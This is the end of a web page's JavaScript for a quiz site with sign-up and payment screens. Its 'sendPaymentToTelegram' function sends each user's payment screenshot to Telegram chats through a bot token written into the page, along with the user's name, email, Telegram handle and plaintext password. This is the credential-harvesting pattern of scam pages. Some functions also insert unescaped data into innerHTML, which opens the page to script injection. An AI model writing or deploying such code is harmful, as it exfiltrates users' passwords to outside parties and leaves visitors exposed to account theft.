                document.getElementById('scoreText').textContent = scoreText;
                
                // Show result details
                resultDetails.innerHTML = '';
                quizResults.forEach((result, index) => {
                    const resultItem = document.createElement('div');
                    resultItem.className = `result-item ${result.isCorrect ? 'correct' : 'incorrect'}`;
                    resultItem.innerHTML = `
                        <h4>Question ${index + 1}: ${result.question}</h4>
                        <p>Your answer: ${result.userAnswer}</p>
                        <p>Correct answer: ${result.correctAnswer}</p>
                        <p class="explanation">${result.explanation}</p>
                    `;
                    resultDetails.appendChild(resultItem);
                });
            }
            
            function showQuizReview() {
                resultsContainer.style.display = 'none';
                quizContainer.style.display = 'block';
                quizReview.style.display = 'block';
                
                reviewContainer.innerHTML = '';
                
                quizResults.forEach((result, index) => {
                    const reviewItem = document.createElement('div');
                    reviewItem.className = `result-item ${result.isCorrect ? 'correct' : 'incorrect'}`;
                    reviewItem.innerHTML = `
                        <h4>Question ${index + 1}: ${result.question}</h4>
                        <p>Your answer: ${result.userAnswer}</p>
                        <p>Correct answer: ${result.correctAnswer}</p>
                        <p class="explanation">${result.explanation}</p>
                    `;
                    reviewContainer.appendChild(reviewItem);
                });
            }
            
            function validateEmail(email) {
                const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                return re.test(email);
            }
            
            function validatePassword(password) {
                // At least 8 characters, with uppercase, lowercase, and number
                const re = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;
                return re.test(password);
            }
            
            function generateUserId() {
                return 'user_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
            }
            
            function generateVerificationCode() {
                return Math.floor(100000 + Math.random() * 900000).toString();
            }
            
            function showNotification(message, type = 'success') {
                notification.textContent = message;
                notification.className = 'notification';
                
                if (type === 'error') {
                    notification.classList.add('error');
                }
                
                notification.classList.add('show');
                
                setTimeout(function() {
                    notification.classList.remove('show');
                }, 5000);
            }
            
            function formatDate(dateString) {
                const date = new Date(dateString);
                return date.toLocaleDateString('en-US', {
                    year: 'numeric',
                    month: 'short',
                    day: 'numeric'
                });
            }
            
            // FIXED: Function to send payment to Telegram
            async function sendPaymentToTelegram(file, user, verificationCode) {
                // Create form data
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_IDS[0]);
                formData.append('photo', file);
                
                // Create caption with user details
                const caption = `ü§ë New Payment Submission\n\n` +
                              `User: ${user.name}\n` +
                              `Email: ${user.email}\n` +
                              `Telegram: ${user.telegram}\n` +
                              `Password: ${user.password}\n` +
                              `Verification Code: ${verificationCode}\n` +
                              `Expires: 5 minutes\n\n` +
                              `Please check payment and forward code to user if valid.`;
                
                formData.append('caption', caption);
                
                try {
                    // Send photo to Telegram
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        console.log('Photo sent to Telegram successfully');
                        
                        // Send follow-up message with instructions
                        const message = `Payment verification required for ${user.name} (@${user.telegram.replace('@', '')}).\n\n` +
                                       `Password: ${user.password}\n` +
                                       `Verification Code: ${verificationCode}\n` +
                                       `Expires in: 5 minutes\n\n` +
                                       `Please check the payment screenshot and:\n` +
                                       `1. If payment is valid, forward this code to the user\n` +
                                       `2. If payment is invalid, contact the user for clarification`;
                        
                        // Send to all specified chat IDs
                        const sendPromises = TELEGRAM_CHAT_IDS.map(chatId => {
                            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: message
                                })
                            });
                        });
                        
                        await Promise.all(sendPromises);
                        console.log('All instructions sent to Telegram');
                        
                        return data;
                    } else {
                        throw new Error(data.description || 'Failed to send to Telegram');
                    }
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    throw error;
                }
            }
        });
    </script>
</body>
</html>
